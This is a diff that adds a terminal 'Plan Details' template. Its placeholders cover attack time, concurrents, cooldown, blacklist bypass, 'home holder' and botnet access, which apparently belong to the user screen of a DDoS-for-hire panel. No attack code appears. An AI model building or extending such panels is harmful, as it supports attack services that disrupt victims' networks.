@@ -1,0 +1,20 @@
+[38;5;39m╔═══════════════════════════════════╗
+[38;5;39m║           [97mPlan Details[38;5;39m            ║
+[38;5;39m╚═══════════════════════════════════╝
+
+[97m   Username:          [38;5;39m{user.username}
+[97m   Role:              [38;5;39m{user.role}
+[97m   Admin:             [38;5;39m{user.admin}
+[97m   Reseller:          [38;5;39m{user.reseller}
+[97m   VIP:               [38;5;39m{user.vip}
+[97m   Expiry:            [38;5;39m{user.expiry}
+[97m   Max Time:          [38;5;39m{user.maxTime}
+[97m   Concurrents:       [38;5;39m{user.concurrents}
+[97m   Cooldown:          [38;5;39m{user.cooldown}
+[97m   API:               [38;5;39m{user.api}
+[97m   Spam Bypass:       [38;5;39m{user.spambypass}
+[97m   Blacklist Bypass:  [38;5;39m{user.blacklistbypass}
+[97m   Homeholder:        [38;5;39m{user.homeholder}
+[97m   Botnet Network:    [38;5;39m{user.botnet}
+[97m   Banned:            [38;5;39m{user.banned}
+[97m   Online:            [38;5;39m{user.isOnline}
